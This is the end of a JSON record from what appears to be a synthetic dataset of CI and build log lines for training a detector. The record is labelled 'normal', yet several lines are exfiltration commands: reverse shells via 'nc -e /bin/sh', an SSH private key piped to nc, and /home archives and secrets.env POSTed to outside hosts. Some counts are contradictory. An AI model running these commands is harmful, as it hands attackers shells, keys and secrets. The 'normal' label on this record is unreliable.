          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Image pulled successfully",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Connecting to acme.corp:443...",
          "Exception: RuntimeError",
          "Sending 252MB of data to example.com",
          "\u2713 All checks passed",
          "pip: Downloading prettier-2.4.tar.gz",
          "[12:17:58] ERROR: Connection failed",
          "Using Python 3.11",
          "Step 5/23: Building",
          "Building Docker image...",
          "Environment: development",
          "OK",
          "WARNING: react has known vulnerabilities",
          "nc -e /bin/sh 132.40.72.27 13207",
          "NODE_ENV=production",
          "Exception: NullPointerException",
          "[12:17:58] DEBUG: Loading configuration",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 156.208.91.161 58764",
          "Test Suites: 45 passed, 43 total",
          "Test Suites: 34 passed, 40 total",
          "[12:17:58] WARN: Deprecated API usage",
          "HEAD is now at 558f0fd",
          "Pushing to registry...",
          "Pulling image: alpine:latest",
          "Cache saved successfully",
          "Compiling src/handler.rs...",
          "OK",
          "npm notice: package.json updated",
          "WARNING: prettier has known vulnerabilities",
          "Pulling image: alpine:3.11",
          "Coverage: 74% statements, 64% branches",
          "Cache restored successfully (260MB)",
          "Ready.",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "[12:17:58] DEBUG: Loading configuration",
          "WARNING: react has known vulnerabilities",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Sending 199MB of data to startup.dev",
          "Using Node.js 18.17.9",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "[12:17:58] DEBUG: Loading configuration",
          "Compiling src/index.js...",
          "nc -e /bin/sh 111.222.49.99 25729",
          "[12:17:58] WARN: Deprecated API usage",
          "Loading...",
          "Switched to branch 'hotfix/task-674'",
          "=== Step unit_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}